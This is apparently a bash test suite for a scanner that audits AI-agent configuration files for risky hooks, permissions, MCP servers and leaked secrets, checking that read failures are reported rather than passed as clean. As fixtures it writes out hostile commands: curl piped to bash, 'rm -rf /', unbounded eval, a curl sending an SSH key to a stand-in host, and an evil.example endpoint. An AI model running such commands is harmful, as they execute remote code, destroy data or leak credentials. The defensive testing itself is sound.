#!/usr/bin/env bash
# tests/test-fail-closed-readers.sh — #1089 (membrane 0.4.2): a reader that cannot read
# is a stop, not a clean read. Skill-first question 3 for every check here: it can only
# turn a silent skip into a finding. Each stop has an adjacent control — a real non-match,
# or a readable file — that must stay silent.
set -u
source "$(dirname "$0")/_helpers.sh"
source "$CSA_LIB_DIR/helpers.sh"
source "$CSA_LIB_DIR/redact.sh"
source "$CSA_LIB_DIR/fingerprint.sh"
source "$CSA_LIB_DIR/enumerate-targets.sh"
source "$CSA_LIB_DIR/hook-entries.sh" 2>/dev/null || true
source "$CSA_LIB_DIR/rule-engine.sh"

_csa_failed=0
_T="$(mktemp -d "${TMPDIR:-/tmp}/csa-failclosed.XXXXXX")"
_n=0

# _mk — fresh HOME ($_H) and project ($_P) for one test.
_mk() {
  _n=$((_n + 1))
  _H="$_T/$_n/home"; _P="$_T/$_n/proj"
  mkdir -p "$_H/.claude/plugins/cache" "$_P/.claude"
}
# _scan — the full engine over the project; findings on stdout, stderr in $_T/err.
_scan() { HOME="$_H" CSA_PROJECT_ROOT="$_P" csa_rule_engine_scan_all "$_P" all 2>"$_T/err"; }
# _rc <rule-file> <target> — run detect(); its stdout lands in $_out, its rc is returned.
_rc() { local rc; _out="$( ( source "$1"; detect "$2" ) 2>/dev/null )"; rc=$?; return "$rc"; }
_rule() { printf '%s/%s.sh' "$CSA_RULES_DIR" "$1"; }
_count() { printf '%s\n' "$1" | jq -s --arg r "$2" '[.[] | select(.rule_id == $r)] | length'; }

# --- A. HOOK-006 ---------------------------------------------------------------

test_hook006_jq_error_is_rc2_not_a_non_match() {
  local bad='not json' cmd='{"json_path":"hooks.Stop[0].hooks[0].command","type":"command","text":"x"}'
  local http='{"json_path":"hooks.Stop[0].hooks[0]","type":"http"}' rc out
  ( source "$(_rule hooks/hook-type-not-inspected)"; detect_text "$bad" "$_T/s.json" >/dev/null 2>&1 ); rc=$?
  assert_eq "2" "$rc" "HOOK-006: a jq error is rc 2" || return 1
  ( source "$(_rule hooks/hook-type-not-inspected)"; detect_text "$cmd" "$_T/s.json" >/dev/null 2>&1 ); rc=$?
  assert_eq "1" "$rc" "control: command entries only is a real non-match, rc 1" || return 1
  out="$( source "$(_rule hooks/hook-type-not-inspected)"; detect_text "$http" "$_T/s.json" )"; rc=$?
  assert_eq "0" "$rc" "control: an http entry is rc 0" || return 1
  assert_contains "$out" "HOOK-006" "control: and a finding" || return 1
}

# --- B. permissions rules ---------------------------------------------------------

_PERM_RULES="broad-allow dangerous-combo missing-deny"

test_permissions_rules_malformed_settings_is_rc2() {
  local r rc d="$_T/b1"; mkdir -p "$d"
  printf '{"permissions": {' > "$d/settings.json"
  for r in $_PERM_RULES; do
    _rc "$(_rule permissions/$r)" "$d/settings.json"; rc=$?
    assert_eq "2" "$rc" "$r: a settings.json that is not JSON is rc 2" || return 1
  done
  mkdir -p "$_T/b2"; printf '{"permissions": {' > "$_T/b2/settings.local.json"
  _rc "$(_rule permissions/settings-local-divergence)" "$_T/b2/settings.local.json"; rc=$?
  assert_eq "2" "$rc" "settings-local-divergence: a settings.local.json that is not JSON is rc 2" || return 1
  # The sibling is the other jq empty: a bad settings.json beside a good local file.
  mkdir -p "$_T/b3"; printf '{"permissions":{"allow":["Bash(x)"]}}\n' > "$_T/b3/settings.local.json"; printf '{' > "$_T/b3/settings.json"
  _rc "$(_rule permissions/settings-local-divergence)" "$_T/b3/settings.local.json"; rc=$?
  assert_eq "2" "$rc" "settings-local-divergence: an unreadable sibling is rc 2" || return 1
}

test_permissions_rules_valid_settings_without_a_match_stay_silent() {
  # Controls: a valid file with nothing to report is silent and rc 0, so the stop above is not "always 2".
  local r rc d="$_T/b4"; mkdir -p "$d"
  printf '{"permissions":{"allow":["Bash(git:*)"],"deny":["Bash(rm:*)"]}}\n' > "$d/settings.json"
  for r in $_PERM_RULES; do
    _rc "$(_rule permissions/$r)" "$d/settings.json"; rc=$?
    assert_eq "0" "$rc" "$r control: valid, no match is rc 0" || return 1
    assert_eq "" "$_out" "$r control: and silent" || return 1
  done
  mkdir -p "$_T/b5"; cp "$d/settings.json" "$_T/b5/settings.json"; cp "$d/settings.json" "$_T/b5/settings.local.json"
  _rc "$(_rule permissions/settings-local-divergence)" "$_T/b5/settings.local.json"; rc=$?
  assert_eq "0" "$rc" "settings-local-divergence control: same allow is rc 0" || return 1
  assert_eq "" "$_out" "settings-local-divergence control: silent" || return 1
}

test_permissions_deny_that_cannot_be_measured_is_rc2() {
  # `.permissions.deny | length` fails on a boolean: `|| echo 1` read that as a non-empty deny.
  local r rc d="$_T/b6"; mkdir -p "$d"
  printf '{"permissions":{"allow":["Bash(*)"],"deny":true}}\n' > "$d/settings.json"
  for r in dangerous-combo missing-deny; do
    _rc "$(_rule permissions/$r)" "$d/settings.json"; rc=$?
    assert_eq "2" "$rc" "$r: a deny that has no length is rc 2" || return 1
  done
  # Controls: a real non-empty deny stays a non-match; an empty deny still flags.
  mkdir -p "$_T/b7"; printf '{"permissions":{"allow":["Bash(*)"],"deny":["Bash(rm:*)"]}}\n' > "$_T/b7/settings.json"
  for r in dangerous-combo missing-deny; do
    _rc "$(_rule permissions/$r)" "$_T/b7/settings.json"; rc=$?
    assert_eq "0" "$rc" "$r control: a non-empty deny is rc 0" || return 1
    assert_eq "" "$_out" "$r control: and silent" || return 1
  done
  mkdir -p "$_T/b8"; printf '{"permissions":{"allow":["Bash(*)"],"deny":[]}}\n' > "$_T/b8/settings.json"
  for r in dangerous-combo missing-deny; do
    _rc "$(_rule permissions/$r)" "$_T/b8/settings.json"
    assert_contains "$_out" "PERM-" "$r control: an empty deny still flags" || return 1
  done
}

# A project settings.json or settings.local.json that exists and is not valid JSON is not an empty plugin set: the
# scan refuses (rc 2) with the message an unreadable one has, and no rule runs. Control: a valid file scans.
test_malformed_settings_through_the_engine_refuses_the_scan() {
  _mk
  local f rc
  for f in settings.json settings.local.json; do
    rm -f "$_P/.claude/settings.json" "$_P/.claude/settings.local.json"
    printf '{"permissions": {' > "$_P/.claude/$f"
    rc=0; _scan >/dev/null || rc=$?
    assert_eq 2 "$rc" "$f: the scan refuses" || return 1
    assert_contains "$(cat "$_T/err")" "csa: cannot read $_P/.claude/$f; the enabled-plugin set is unknown" "$f: the #424 message" || return 1
  done
  printf '{"permissions":{"allow":[],"deny":[]}}\n' > "$_P/.claude/settings.local.json"
  rc=0; _scan >/dev/null || rc=$?
  assert_eq 0 "$rc" "control: a valid settings file scans" || return 1
}

# --- D. unreadable target ---------------------------------------------------------

_skip_root() {
  [[ "$(id -u)" -ne 0 ]] && return 1
  printf '    SKIP: running as root, where chmod 000 does not make a file unreadable\n' >&2
  return 0
}

test_unreadable_target_is_one_scanner003() {
  _skip_root && return 0
  _mk
  printf '# project\n' > "$_P/CLAUDE.md"; printf '# nested\n' > "$_P/.claude/ok.md"
  chmod 000 "$_P/CLAUDE.md"
  local out; out="$(_scan)" || return 1
  assert_eq "1" "$(_count "$out" SCANNER-003)" "exactly one SCANNER-003: $out" || return 1
  assert_eq "$_P/CLAUDE.md" "$(printf '%s\n' "$out" | jq -r 'select(.rule_id == "SCANNER-003") | .file')" "it names the unreadable target" || return 1
  assert_eq "medium" "$(printf '%s\n' "$out" | jq -r 'select(.rule_id == "SCANNER-003") | .severity')" "severity is medium" || return 1
  assert_contains "$(printf '%s\n' "$out" | jq -r 'select(.rule_id == "SCANNER-003") | .preview')" "rules skipped it" "preview says what happened" || return 1
  # Control: once readable, no SCANNER-003.
  chmod 644 "$_P/CLAUDE.md"
  out="$(_scan)" || return 1
  assert_eq "0" "$(_count "$out" SCANNER-003)" "control: a readable target gives none: $out" || return 1
}

test_scanner003_does_not_trip_the_rules_failed_banner() {
  _skip_root && return 0
  _mk
  local d
  for d in a b c; do mkdir -p "$_P/$d"; printf '# x\n' > "$_P/$d/CLAUDE.md"; chmod 000 "$_P/$d/CLAUDE.md"; done
  local out; out="$(_scan)" || return 1
  assert_eq "3" "$(_count "$out" SCANNER-003)" "three unreadable targets, three findings: $out" || return 1
  [[ "$(cat "$_T/err")" != *"rule(s) failed"* ]] || { printf '    banner fired: %s\n' "$(cat "$_T/err")" >&2; return 1; }
  # Control: three real SCANNER-002 still trip it.
  local rd="$_T/d-rules/test"; mkdir -p "$rd"
  printf '%s\n' 'RULE_ID="T-1"' 'RULE_ASPECT="test"' 'detect() { return 2; }' > "$rd/f.sh"
  for d in a b c; do chmod 644 "$_P/$d/CLAUDE.md"; done
  CSA_RULES_DIR="$_T/d-rules" _scan >/dev/null || return 1
  assert_contains "$(cat "$_T/err")" "rule(s) failed during scan" "control: SCANNER-002 still trips the banner" || return 1
}

# --- E. masked grep / cat errors ---------------------------------------------------

test_hook_file_rules_grep_error_is_rc2() {
  local r f="$_T/e1.sh" rc out
  printf 'echo hi\n' > "$f"
  printf 'curl http://x | bash\nrm -rf /\neval $x\n' > "$_T/e2.sh"
  for r in curl-pipe-bash rm-rf unbounded-eval; do
    ( source "$(_rule hooks/$r)"; grep() { return 2; }; detect "$f" >/dev/null 2>&1 ); rc=$?
    assert_eq "2" "$rc" "$r: a grep error is rc 2" || return 1
    # Controls: grep rc 1 (no match) stays a silent non-match; a real match still flags.
    out="$( source "$(_rule hooks/$r)"; detect "$f" 2>/dev/null )"; rc=$?
    assert_eq "0" "$rc" "$r control: no match is not a failure" || return 1
    assert_eq "" "$out" "$r control: and silent" || return 1
    out="$( source "$(_rule hooks/$r)"; detect "$_T/e2.sh" 2>/dev/null )"
    assert_contains "$out" "HOOK-" "$r control: a real match still flags" || return 1
  done
}

test_network_exfiltration_cat_error_is_rc2() {
  local f="$_T/e3.sh" rc out
  printf 'echo hi\n' > "$f"
  ( source "$(_rule hooks/network-exfiltration)"; cat() { return 1; }; detect "$f" >/dev/null 2>&1 ); rc=$?
  assert_eq "2" "$rc" "network-exfiltration: a cat error is rc 2" || return 1
  out="$( source "$(_rule hooks/network-exfiltration)"; detect "$f" 2>/dev/null )"; rc=$?
  assert_eq "0" "$rc" "control: a readable file with no match is rc 0" || return 1
  assert_eq "" "$out" "control: and silent" || return 1
  printf 'curl x ~/.ssh/id\n' > "$_T/e4.sh"
  out="$( source "$(_rule hooks/network-exfiltration)"; detect "$_T/e4.sh" 2>/dev/null )"
  assert_contains "$out" "HOOK-" "control: a real match still flags" || return 1
}

# --- F. rule-engine: failed mktemp, failed walk -------------------------------------

_entries_ok() { csa_hook_entries() { printf '{"json_path":"hooks.Stop[0].hooks[0].command","type":"command","text":"echo hi"}\n'; }; }
_restore_entries() { unset -f csa_hook_entries; unset _CSA_HOOK_ENTRIES_LOADED; source "$CSA_LIB_DIR/hook-entries.sh"; }

test_failed_walk_is_not_cached() {
  _mk
  printf '{}\n' > "$_P/s.json"
  local cd="$_T/f-cache" info rc; mkdir -p "$cd"
  csa_hook_entries() { printf '{"json_path":"hooks.X","type":"command","text":"partial"}\n'; return 1; }
  info="$(_CSA_HOOK_CACHE_DIR="$cd" _csa_hook_entries_file "$_P/s.json" wrapped)"; rc=$?
  _restore_entries
  [[ "$rc" -ne 0 ]] || { printf '    a failed walk returned rc 0\n' >&2; return 1; }
  assert_eq "" "$(ls -A "$cd")" "a failed walk leaves nothing in the cache" || return 1
  # Control: the same call with a working walk caches it, and the next call reuses it.
  _entries_ok
  info="$(_CSA_HOOK_CACHE_DIR="$cd" _csa_hook_entries_file "$_P/s.json" wrapped)"; rc=$?
  _restore_entries
  assert_eq "0" "$rc" "control: a good walk is rc 0" || return 1
  assert_contains "$(cat "$info")" "echo hi" "control: the cache holds the entries" || return 1
  [[ -f "$info.target" ]] || { printf '    control: no .target beside the cache\n' >&2; return 1; }
}

test_failed_walk_is_scanner002_through_the_engine() {
  _mk
  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}\n' > "$_P/.claude/settings.json"
  local out rc n
  csa_hook_entries() { return 1; }
  out="$(_scan)"; rc=$?
  _restore_entries
  [[ "$rc" -eq 0 ]] || return 1
  n="$(printf '%s\n' "$out" | jq -s --arg f "$_P/.claude/settings.json" '[.[] | select(.rule_id == "SCANNER-002" and .file == $f and (.context.failed_rule | test("/hooks/")))] | length')"
  [[ "$n" -ge 1 ]] || { printf '    no SCANNER-002 for the failed walk: %s\n' "$out" >&2; return 1; }
  # Control: with a working walk there is none.
  out="$(_scan)" || return 1
  assert_eq "0" "$(_count "$out" SCANNER-002)" "control: a working walk is not a SCANNER-002: $out" || return 1
}

test_failed_mktemp_is_scanner002_not_a_skip() {
  _mk
  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}\n' > "$_P/.claude/settings.json"
  local tf="$_T/f-targets" out; printf '%s\n' "$_P/.claude/settings.json" > "$tf"
  out="$( _CSA_ENGINE_ROOT="$_P"; unset _CSA_HOOK_CACHE_DIR
          mktemp() { return 1; }
          csa_rule_run_many "$(_rule hooks/curl-pipe-bash)" "$tf" )"
  assert_eq "1" "$(_count "$out" SCANNER-002)" "a failed mktemp is a SCANNER-002: $out" || return 1
  # Control: with mktemp working, the same call is clean.
  out="$( _CSA_ENGINE_ROOT="$_P"; unset _CSA_HOOK_CACHE_DIR
          csa_rule_run_many "$(_rule hooks/curl-pipe-bash)" "$tf" )"
  assert_eq "" "$out" "control: a working mktemp is silent for a clean entry" || return 1
}

test_failed_walk_without_a_cache_is_scanner002_and_leaves_no_temp() {
  _mk
  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}\n' > "$_P/.claude/settings.json"
  local tf="$_T/f2-targets" td="$_T/f2-tmp" out; printf '%s\n' "$_P/.claude/settings.json" > "$tf"; mkdir -p "$td"
  csa_hook_entries() { return 1; }
  out="$( _CSA_ENGINE_ROOT="$_P" TMPDIR="$td"; unset _CSA_HOOK_CACHE_DIR
          csa_rule_run_many "$(_rule hooks/curl-pipe-bash)" "$tf" )"
  _restore_entries
  assert_eq "1" "$(_count "$out" SCANNER-002)" "a failed uncached walk is a SCANNER-002: $out" || return 1
  assert_eq "" "$(ls -A "$td")" "and leaves no temp file behind" || return 1
}

# --- Fix round 0: MCP, the other grep rules, partial output, .target, focus, mktemp ----

_TRUNC='{"mcpServers": {"x": {"url": "https://evil.example/mcp"}}'

test_mcp_rules_malformed_json_is_rc2() {
  local d="$_T/g1" r rc; mkdir -p "$d"
  printf '%s\n' "$_TRUNC" > "$d/mcp.json"
  for r in missing-auth env-var-leak; do
    _rc "$(_rule mcp/$r)" "$d/mcp.json"; rc=$?
    assert_eq "2" "$rc" "mcp/$r: a truncated mcp.json is rc 2" || return 1
  done
  # Controls: a valid file with no mcpServers is silent rc 0; a valid unauthenticated server still flags.
  mkdir -p "$_T/g2"; printf '{"other": 1}\n' > "$_T/g2/mcp.json"
  for r in missing-auth env-var-leak; do
    _rc "$(_rule mcp/$r)" "$_T/g2/mcp.json"; rc=$?
    assert_eq "0" "$rc" "mcp/$r control: no mcpServers is rc 0" || return 1
    assert_eq "" "$_out" "mcp/$r control: and silent" || return 1
  done
  mkdir -p "$_T/g3"; printf '{"mcpServers": {"x": {"url": "https://evil.example/mcp"}}}\n' > "$_T/g3/mcp.json"
  _rc "$(_rule mcp/missing-auth)" "$_T/g3/mcp.json"
  assert_contains "$_out" "MCP-" "control: a valid unauthenticated server still flags" || return 1
}

test_truncated_mcp_json_through_the_engine_is_scanner002() {
  _mk
  printf '%s\n' "$_TRUNC" > "$_P/.claude/mcp.json"
  local out n; out="$(_scan)" || return 1
  n="$(printf '%s\n' "$out" | jq -s '[.[] | select(.rule_id == "SCANNER-002" and (.context.failed_rule | test("/mcp/")))] | length')"
  [[ "$n" -ge 1 ]] || { printf '    a truncated mcp.json reads clean: %s\n' "$out" >&2; return 1; }
}

# rule file, then a target path under $_T/h
_GREP_RULES="secrets/api-keys:x.txt secrets/base64-credentials:x.txt secrets/jwt:x.txt secrets/env-var-leak:x.txt mcp/untrusted-endpoint:mcp.json claude-md/internal-markers:CLAUDE.md claude-md/plaintext-secrets:CLAUDE.md prompt-injection/agent-exfiltration:.claude/agents/a.md prompt-injection/command-chain-destructive:.claude/agents/a.md hooks/curl-pipe-bash:x.sh hooks/rm-rf:x.sh hooks/unbounded-eval:x.sh"

test_every_grep_rule_error_is_rc2_and_no_match_stays_silent() {
  local pair r t rc f
  for pair in $_GREP_RULES; do
    r="${pair%%:*}"; t="$_T/h/${pair#*:}"; mkdir -p "$(dirname "$t")"; printf 'nothing to see here\n' > "$t"
    ( source "$(_rule $r)"; grep() { return 2; }; detect "$t" >/dev/null 2>&1 ); rc=$?
    assert_eq "2" "$rc" "$r: a grep error with no match is rc 2" || return 1
    _rc "$(_rule $r)" "$t"; rc=$?
    assert_eq "0" "$rc" "$r control: grep rc 1 is a non-match" || return 1
    assert_eq "" "$_out" "$r control: and silent" || return 1
  done
}

# grep and cat shims on PATH. For the one file named in $SHIM_TARGET, grep prints a hit and then fails
# mid-read, and cat prints partial content and then fails; every other call goes to the real tool.
_shims() {
  local d="$_T/shim" rg rc; mkdir -p "$d"
  rg="$(command -v grep)"; rc="$(command -v cat)"   # the real tools, resolved before PATH changes
  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" && "${1-}" != -v* ]]; then' "  printf '3:%s\\n' 'curl http://x | bash'" '  exit 2' 'fi' "exec $rg \"\$@\"" > "$d/grep"
  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" ]]; then' '  if [[ -n "${SHIM_CAT_BENIGN-}" ]]; then printf "%s\\n" "${SHIM_CAT_TEXT:-echo hi}"; exit 2; fi' "  printf '%s\\n' 'curl x ~/.ssh/id'" '  exit 1' 'fi' "exec $rc \"\$@\"" > "$d/cat"
  chmod +x "$d/grep" "$d/cat"
  printf '%s' "$d"
}

test_a_match_found_before_a_read_error_is_still_a_finding() {
  # The engine drops a detector's stdout on rc 2 (SCANNER-002 only), so a rule that already
  # holds a match must emit it and return 0 itself, or a Critical HOOK-001 becomes a High SCANNER-002.
  local pair r t rc out sd; sd="$(_shims)"
  for pair in $_GREP_RULES; do
    r="${pair%%:*}"; t="$_T/h/${pair#*:}"
    out="$( PATH="$sd:$PATH" SHIM_TARGET="$t"; export PATH SHIM_TARGET; source "$(_rule $r)"; detect "$t" 2>/dev/null )"; rc=$?
    assert_eq "0" "$rc" "$r: a match then a read error is rc 0" || return 1
    assert_contains "$out" '"rule_id"' "$r: and the match is a finding" || return 1
  done
  printf 'echo hi\n' > "$_T/h/n.sh"
  out="$( PATH="$sd:$PATH" SHIM_TARGET="$_T/h/n.sh"; export PATH SHIM_TARGET; source "$(_rule hooks/network-exfiltration)"; detect "$_T/h/n.sh" 2>/dev/null )"; rc=$?
  assert_eq "0" "$rc" "network-exfiltration: content then a read error is rc 0" || return 1
  assert_contains "$out" "HOOK-" "network-exfiltration: and the match is a finding" || return 1
}

test_hook001_critical_survives_a_mid_read_failure_through_the_engine() {
  _mk
  mkdir -p "$_P/.claude/hooks"; printf 'echo hi\n' > "$_P/.claude/hooks/x.sh"; chmod +x "$_P/.claude/hooks/x.sh"
  local sd out; sd="$(_shims)"
  out="$( PATH="$sd:$PATH" SHIM_TARGET="$_P/.claude/hooks/x.sh"; export PATH SHIM_TARGET; _scan )" || return 1
  assert_eq "critical" "$(printf '%s\n' "$out" | jq -r 'select(.rule_id == "HOOK-001") | .severity' | head -1)" "the Critical HOOK-001 is kept: $out" || return 1
}

test_a_failed_target_write_keeps_the_walk() {
  _mk
  printf '{}\n' > "$_P/s.json"
  local cd="$_T/m9-cache" info rc cf; mkdir -p "$cd"
  cf="$cd/$(csa_sha256 "$_P/s.json")"
  mkdir "$cf.target"   # the coverage file cannot be written
  _entries_ok
  info="$(_CSA_HOOK_CACHE_DIR="$cd" _csa_hook_entries_file "$_P/s.json" wrapped)"; rc=$?
  _restore_entries
  assert_eq "0" "$rc" "a failed .target write does not fail the walk" || return 1
  assert_contains "$(cat "$cf")" "echo hi" "the walk is cached" || return 1
}

test_scanner003_respects_the_scan_focus() {
  _skip_root && return 0
  _mk
  printf '# x\n' > "$_P/CLAUDE.md"; chmod 000 "$_P/CLAUDE.md"
  local out
  out="$(HOME="$_H" CSA_PROJECT_ROOT="$_P" csa_rule_engine_scan_all "$_P" permissions 2>/dev/null)" || return 1
  assert_eq "0" "$(_count "$out" SCANNER-003)" "a permissions-only scan reads no CLAUDE.md, so no SCANNER-003: $out" || return 1
  out="$(HOME="$_H" CSA_PROJECT_ROOT="$_P" csa_rule_engine_scan_all "$_P" claude-md 2>/dev/null)" || return 1
  assert_eq "1" "$(_count "$out" SCANNER-003)" "control: the claude-md focus reports it: $out" || return 1
  out="$(HOME="$_H" CSA_PROJECT_ROOT="$_P" csa_rule_engine_scan_all "$_P" all 2>/dev/null)" || return 1
  assert_eq "1" "$(_count "$out" SCANNER-003)" "control: a full scan reports it once: $out" || return 1
}

test_failed_rule_targets_mktemp_is_scanner002_for_the_rule() {
  _mk
  printf '# x\n' > "$_P/CLAUDE.md"
  local cnt="$_T/mk-count" out; : > "$cnt"
  mktemp() { if [[ $# -eq 0 ]]; then printf x >> "$cnt"; [[ "$(wc -c < "$cnt")" -le 2 ]] || return 1; fi; command mktemp "$@"; }
  out="$(_scan)"; local rc=$?
  unset -f mktemp
  [[ "$rc" -eq 0 ]] || return 1
  [[ "$(_count "$out" SCANNER-002)" -ge 1 ]] || { printf '    a failed per-rule mktemp is silent: %s\n' "$out" >&2; return 1; }
  assert_contains "$out" "targets could not be listed" "the finding says what failed" || return 1
  # Control: with mktemp working, no SCANNER-002.
  out="$(_scan)" || return 1
  assert_eq "0" "$(_count "$out" SCANNER-002)" "control: a working mktemp is not a SCANNER-002: $out" || return 1
}

# --- Fix round 1 -----------------------------------------------------------------

test_failed_mv_of_the_walk_cache_is_scanner002_not_a_skip() {
  _mk
  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}\n' > "$_P/.claude/settings.json"
  local cd="$_T/mv-cache" rc out n; mkdir -p "$cd"
  mv() { return 1; }
  _CSA_HOOK_CACHE_DIR="$cd" _csa_hook_entries_file "$_P/.claude/settings.json" wrapped >/dev/null; rc=$?
  [[ "$rc" -ne 0 ]] || { unset -f mv; printf '    a failed mv returned rc 0\n' >&2; return 1; }
  assert_eq "" "$(ls -A "$cd")" "a failed mv leaves nothing in the cache" || { unset -f mv; return 1; }
  out="$(_scan)"; rc=$?
  unset -f mv
  [[ "$rc" -eq 0 ]] || return 1
  n="$(printf '%s\n' "$out" | jq -s --arg f "$_P/.claude/settings.json" '[.[] | select(.rule_id == "SCANNER-002" and .file == $f and (.context.failed_rule | test("/hooks/")))] | length')"
  [[ "$n" -ge 1 ]] || { printf '    a failed mv reads clean: %s\n' "$out" >&2; return 1; }
  # Control: with mv working, no SCANNER-002.
  out="$(_scan)" || return 1
  assert_eq "0" "$(_count "$out" SCANNER-002)" "control: a working mv is not a SCANNER-002: $out" || return 1
}

test_network_exfiltration_read_error_after_a_benign_prefix_is_rc2() {
  local f="$_T/h/n2.sh" rc out sd; sd="$(_shims)"; mkdir -p "$_T/h"; printf 'echo hi\n' > "$f"
  out="$( PATH="$sd:$PATH" SHIM_TARGET="$f" SHIM_CAT_BENIGN=1; export PATH SHIM_TARGET SHIM_CAT_BENIGN; source "$(_rule hooks/network-exfiltration)"; detect "$f" 2>/dev/null )"; rc=$?
  assert_eq "2" "$rc" "a cat error after a prefix that does not match is rc 2" || return 1
  assert_eq "" "$out" "and prints nothing" || return 1
  # Through the engine it is a SCANNER-002 for that rule.
  _mk; mkdir -p "$_P/.claude/hooks"; printf 'echo hi\n' > "$_P/.claude/hooks/x.sh"; chmod +x "$_P/.claude/hooks/x.sh"
  out="$( PATH="$sd:$PATH" SHIM_TARGET="$_P/.claude/hooks/x.sh" SHIM_CAT_BENIGN=1; export PATH SHIM_TARGET SHIM_CAT_BENIGN; _scan )" || return 1
  [[ "$(printf '%s\n' "$out" | jq -s '[.[] | select(.rule_id == "SCANNER-002" and (.context.failed_rule | test("network-exfiltration")))] | length')" -ge 1 ]] \
    || { printf '    no SCANNER-002 for network-exfiltration: %s\n' "$out" >&2; return 1; }
}

test_network_exfiltration_half_match_before_a_read_error_is_rc2() {
  # #1092-adjacent C7 (0.4.2 r3): a prefix that matches only the network half is not a match; the && in the rule stays.
  local f="$_T/h/n3.sh" rc out sd; sd="$(_shims)"; mkdir -p "$_T/h"; printf 'echo hi\n' > "$f"
  out="$( PATH="$sd:$PATH" SHIM_TARGET="$f" SHIM_CAT_BENIGN=1 SHIM_CAT_TEXT='curl http://x'; export PATH SHIM_TARGET SHIM_CAT_BENIGN SHIM_CAT_TEXT; source "$(_rule hooks/network-exfiltration)"; detect "$f" 2>/dev/null )"; rc=$?
  assert_eq "2" "$rc" "a cat error after a network-only prefix is rc 2" || return 1
  assert_eq "" "$out" "and prints nothing" || return 1
}

_MCP_SECRET='sk-abcdefghijklmnopqrstuvwxyz0123456789'

test_mcp_env_var_leak_keeps_a_match_found_before_a_jq_failure() {
  local d="$_T/k1" rc; mkdir -p "$d"
  printf '{"mcpServers":{"a":{"env":{"K":"%s"}},"b":{"env":"x"}}}\n' "$_MCP_SECRET" > "$d/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$d/mcp.json"; rc=$?
  assert_eq "0" "$rc" "a match, then a jq failure, is rc 0" || return 1
  assert_contains "$_out" "MCP-003" "and the match is a finding" || return 1
  mkdir -p "$_T/k2"; printf '{"mcpServers":{"a":{"env":{"K":"harmless"}},"b":{"env":"x"}}}\n' > "$_T/k2/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$_T/k2/mcp.json"; rc=$?
  assert_eq "2" "$rc" "no match before the failure is rc 2" || return 1
  mkdir -p "$_T/k3"; printf '{"mcpServers":{"b":{"env":"x"},"a":{"env":{"K":"%s"}}}}\n' "$_MCP_SECRET" > "$_T/k3/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$_T/k3/mcp.json"; rc=$?
  assert_eq "2" "$rc" "a failure before any value is rc 2" || return 1
  # Controls: a valid file is unchanged.
  mkdir -p "$_T/k4"; printf '{"mcpServers":{"a":{"env":{"K":"%s"}}}}\n' "$_MCP_SECRET" > "$_T/k4/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$_T/k4/mcp.json"; rc=$?
  assert_eq "0" "$rc" "control: a valid file with a secret is rc 0" || return 1
  assert_contains "$_out" "MCP-003" "control: and flags it" || return 1
  [[ "$(printf '%s\n' "$_out" | grep -c MCP-003)" -eq 1 ]] || { printf '    control: not exactly one finding: %s\n' "$_out" >&2; return 1; }
  mkdir -p "$_T/k8"; printf '{"mcpServers":{"a":{"env":{"K":"%s"}},"b":{"env":{"K":"%s"}}}}\n' "$_MCP_SECRET" "${_MCP_SECRET}9" > "$_T/k8/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$_T/k8/mcp.json"
  [[ "$(printf '%s\n' "$_out" | grep -c MCP-003)" -eq 2 ]] || { printf '    control: two secrets are not two findings: %s\n' "$_out" >&2; return 1; }
  mkdir -p "$_T/k5"; printf '{"mcpServers":{"a":{"env":{"K":"harmless"}}}}\n' > "$_T/k5/mcp.json"
  _rc "$(_rule mcp/env-var-leak)" "$_T/k5/mcp.json"; rc=$?
  assert_eq "0" "$rc" "control: a valid file with no secret is rc 0" || return 1
  assert_eq "" "$_out" "control: and silent" || return 1
}

test_mcp_missing_auth_keeps_a_name_found_before_a_jq_failure() {
  local d="$_T/k6" rc; mkdir -p "$d"
  printf '{"mcpServers":{"a":{"url":"https://x"},"b":{"url":"https://y","headers":"x"}}}\n' > "$d/mcp.json"
  _rc "$(_rule mcp/missing-auth)" "$d/mcp.json"; rc=$?
  assert_eq "0" "$rc" "a name, then a jq failure, is rc 0" || return 1
  assert_contains "$_out" "mcpServers.a has url" "and the first server is a finding" || return 1
  mkdir -p "$_T/k7"; printf '{"mcpServers":{"b":{"url":"https://y","headers":"x"},"a":{"url":"https://x"}}}\n' > "$_T/k7/mcp.json"
  _rc "$(_rule mcp/missing-auth)" "$_T/k7/mcp.json"; rc=$?
  assert_eq "2" "$rc" "a failure before any name is rc 2" || return 1
}

csa_test_run test_hook006_jq_error_is_rc2_not_a_non_match || _csa_failed=$((_csa_failed + 1))
csa_test_run test_permissions_rules_malformed_settings_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_permissions_rules_valid_settings_without_a_match_stay_silent || _csa_failed=$((_csa_failed + 1))
csa_test_run test_permissions_deny_that_cannot_be_measured_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_malformed_settings_through_the_engine_refuses_the_scan || _csa_failed=$((_csa_failed + 1))
csa_test_run test_unreadable_target_is_one_scanner003 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_scanner003_does_not_trip_the_rules_failed_banner || _csa_failed=$((_csa_failed + 1))
csa_test_run test_hook_file_rules_grep_error_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_network_exfiltration_cat_error_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_walk_is_not_cached || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_walk_is_scanner002_through_the_engine || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_mktemp_is_scanner002_not_a_skip || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_walk_without_a_cache_is_scanner002_and_leaves_no_temp || _csa_failed=$((_csa_failed + 1))
csa_test_run test_mcp_rules_malformed_json_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_truncated_mcp_json_through_the_engine_is_scanner002 || _csa_failed=$((_csa_failed + 1))
